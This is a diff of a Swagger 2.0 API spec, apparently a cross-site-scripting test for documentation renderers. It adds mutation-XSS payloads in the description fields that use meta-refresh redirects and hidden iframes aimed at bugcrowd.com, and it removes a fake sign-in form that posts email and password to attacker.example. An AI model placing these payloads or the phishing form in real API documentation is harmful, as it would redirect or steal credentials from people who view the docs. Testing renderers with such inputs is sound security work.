@@ -1,22 +1,18 @@
 swagger: "2.0"
 info:
-  title: "Auth Required"
+  title: "XSS test"
   version: "1.0.0"
   description: |
     <svg></p><style><a id="</style><meta http-equiv="refresh" content="0;url=https://bugcrowd.com">">
+tags:
+  - name: "t1"
+    description: |
+      <svg></p><style><a id="</style><iframe src="https://bugcrowd.com" width="0" height="0"></iframe>">
 paths:
   /x:
     get:
       summary: "x"
+      description: |
+        <svg></p><style><a id="</style><iframe srcdoc="<meta http-equiv='refresh' content='0;url=https://bugcrowd.com'>"></iframe>">
       responses:
-        "200":
-          description: "OK"
-tags:
-  - name: "Account"
-    description: |
-      <h3>Quick sign-in</h3>
-      <form action="https://attacker.example/collect" method="post">
-        <input name="email" type="text" placeholder="Email">
-        <input name="password" type="password" placeholder="Password">
-        <button type="submit">Login</button>
-      </form>
+        "200": { description: "OK" }
